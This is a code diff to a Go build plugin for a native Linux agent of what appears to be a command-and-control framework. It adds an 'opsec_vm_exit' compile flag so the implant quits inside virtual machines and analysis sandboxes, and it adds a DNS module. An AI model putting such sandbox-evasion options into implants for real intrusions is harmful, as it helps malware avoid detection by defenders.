@@ -367,6 +367,9 @@ type GenerateConfig struct {
 	ReconnectTimeout string `json:"reconn_timeout"`
 	ReconnectCount   int    `json:"reconn_count"`
 	OpsecEnabled     bool   `json:"opsec_enabled"`
+	// 云主机（KVM/QEMU ECS）与分析沙箱在 DMI/cpuinfo 上不可区分，VM 检测
+	// 默认只跑不拦；明确只打物理机时才勾选它（→ -DOPSEC_VM_EXIT）。
+	OpsecVmExit bool `json:"opsec_vm_exit"`
 
 	// --- Stager 下载端点的来源（仅 Stager 格式用到）---
 	//
@@ -622,7 +625,7 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 
 var (
 	NativeSrcDir   = "src_agent/agent"
-	NativeObjFiles = []string{"crt", "msgpack", "crypt", "connector", "agent_info", "commander", "tasks_fs", "tasks_proc", "tasks_linux", "tasks_opsec", "jobs", "tasks_async", "tasks_net", "proxyfire", "elf_resolve", "opsec", "pivot", "tasks_pivot", "ax_vsnprintf", "bof_api", "elf_bof", "ws_connector", "https_emu", "timing", "noise"}
+	NativeObjFiles = []string{"crt", "msgpack", "crypt", "dns", "connector", "agent_info", "commander", "tasks_fs", "tasks_proc", "tasks_linux", "tasks_opsec", "jobs", "tasks_async", "tasks_net", "proxyfire", "elf_resolve", "opsec", "pivot", "tasks_pivot", "ax_vsnprintf", "bof_api", "elf_bof", "ws_connector", "https_emu", "timing", "noise"}
 
 	// Embedded mbedtls (H1 WSS transport) — trimmed TLS1.3 client build
 	NativeMbedtlsSrcDir = "src_agent/mbedtls/library"
@@ -829,6 +832,9 @@ func (p *PluginAgent) buildNativeELF(profile adaptix.BuildProfile, agentProfiles
 	if generateConfig.OpsecEnabled {
 		cFlags += " -DOPSEC_ENABLED"
 	}
+	if generateConfig.OpsecVmExit {
+		cFlags += " -DOPSEC_VM_EXIT"
+	}
 
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling native agent sources (per-payload)...")
 
@@ -928,6 +934,9 @@ func (p *PluginAgent) buildNativeSO(profile adaptix.BuildProfile, agentProfiles 
 	cFlags := fmt.Sprintf("%s -fPIC -DBUILD_SO -I %s -I %s -DDJB2_SEED=%dU", nativeCFlags(arch), tempDir, srcDir, djb2Seed)
 	if generateConfig.OpsecEnabled {
 		cFlags += " -DOPSEC_ENABLED"
+	}
+	if generateConfig.OpsecVmExit {
+		cFlags += " -DOPSEC_VM_EXIT"
 	}
 
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling native agent sources (SO mode, per-payload)...")
